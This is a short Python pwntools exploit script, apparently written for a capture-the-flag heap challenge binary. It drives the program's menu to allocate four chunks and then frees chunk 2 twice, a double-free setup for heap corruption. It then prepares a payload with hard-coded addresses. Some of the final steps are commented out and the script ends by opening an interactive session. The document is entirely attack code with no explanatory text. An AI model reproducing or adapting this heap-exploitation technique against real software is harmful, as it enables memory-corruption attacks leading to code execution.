from pwn import*

p = process('./c')
t = 1

def snap(s):
	p.sendline('3');sleep(t)
	p.sendline(s);sleep(t)

def back(idx):
	p.sendline('4');sleep(t)
	p.sendline(str(idx));sleep(1)

snap('a'*0x20)
snap('b'*0x20)
snap('c'*0x20)
snap('d'*0x20)
back(2)
back(3)
back(2)

pay = ''
pay += p64(0x223a2e0)
#snap(pay)
#snap(p64(0x603000))
#snap('e'*0x10)
#snap('f'*0x20)

p.interactive()
